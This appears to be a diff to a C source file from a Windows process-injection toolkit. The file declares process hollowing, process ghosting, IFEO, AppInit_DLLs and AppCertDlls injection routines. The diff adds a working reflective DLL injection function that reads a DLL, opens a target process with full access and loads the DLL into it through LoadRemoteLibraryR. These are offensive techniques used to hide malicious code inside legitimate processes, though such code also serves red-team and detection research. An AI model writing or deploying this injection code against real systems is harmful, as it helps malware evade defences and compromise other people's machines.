@@ -31,6 +31,8 @@ DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutab
 DWORD InjectUsingImageFileExecutionOptions(WCHAR* TargetProcess, WCHAR* SourceProcessToStart);
 DWORD InjectUsingAppInit_DLLs(WCHAR* DLLName);
 DWORD InjectUsingAppCertDlls(WCHAR* DLLName);
+DWORD InjectUsingReflectiveDLLInjection(DWORD PID, WCHAR* DllPath);
+
 
 DWORD WINAPI InjectUsingProcessGhosting(WCHAR* TargetProcessName, WCHAR* PayloadPath);
 
@@ -400,7 +402,6 @@ DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutab
 		return -1;
 	}
 
-
 	DWORD64 dwDelta = (DWORD64)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
 
 	pSourceHeaders->OptionalHeader.ImageBase = (DWORD64)pPEB->ImageBaseAddress;
@@ -482,6 +483,8 @@ DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutab
 
 			break;
 		}
+
+	//DWORD64 dwEntrypoint = CopyAndFixRelocationForPEfileToRemoteProcess(hProcess, (DWORD64)pPEB->ImageBaseAddress, SourceFileData);
 
 	DWORD64 dwEntrypoint = (DWORD64)pPEB->ImageBaseAddress + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
 
@@ -660,4 +663,60 @@ DWORD WINAPI InjectUsingProcessGhosting(WCHAR* TargetProcessName, WCHAR* Payload
 
 	return 0;
 
+}
+
+
+// your Dll Should Depend on Kernel32 and ntdll.dll only (for stability, you can resolve all the API you need using GetProcAddress and LoadLibrary)
+DWORD InjectUsingReflectiveDLLInjection(DWORD PID, WCHAR* DllPath) {
+	HANDLE hFile = NULL;
+	DWORD Status = NULL;
+	HANDLE hProcess = NULL;
+	HANDLE hToken = NULL;
+	LPVOID lpBuffer = NULL;
+	DWORD dwLength = 0;
+	DWORD dwBytesRead = 0;
+	DWORD dwProcessId = PID;
+
+	hFile = CreateFile(DllPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) {
+		printf("Failed to open the DLL file  Error Code %x\n", GetLastError());
+		return -1;
+	}
+
+	dwLength = GetFileSize(hFile, NULL);
+	if (dwLength == INVALID_FILE_SIZE || dwLength == 0) {
+		printf("Failed to get the DLL file size  Error Code %x\n", GetLastError());
+	}
+
+	lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
+	if (!lpBuffer) {
+		printf("Failed to get the DLL file size  Error Code %x\n", GetLastError());
+		return -1;
+	}
+
+	if (ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL) == FALSE) {
+		printf("Failed to alloc a buffer!");
+		return -1;
+	}
+
+	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
+	if (!hProcess) {
+		printf("Failed to open the target process  Error Code %x\n", GetLastError());
+		return -1;
+	}
+
+	Status = LoadRemoteLibraryR(hProcess, (BYTE*)lpBuffer, NULL);
+	if (Status == -1) {
+		return -1;
+	}
+
+	//WaitForSingleObject(hModule, -1);
+
+	if (lpBuffer)
+		HeapFree(GetProcessHeap(), 0, lpBuffer);
+
+	if (hProcess)
+		CloseHandle(hProcess);
+
+	return 0;
 }
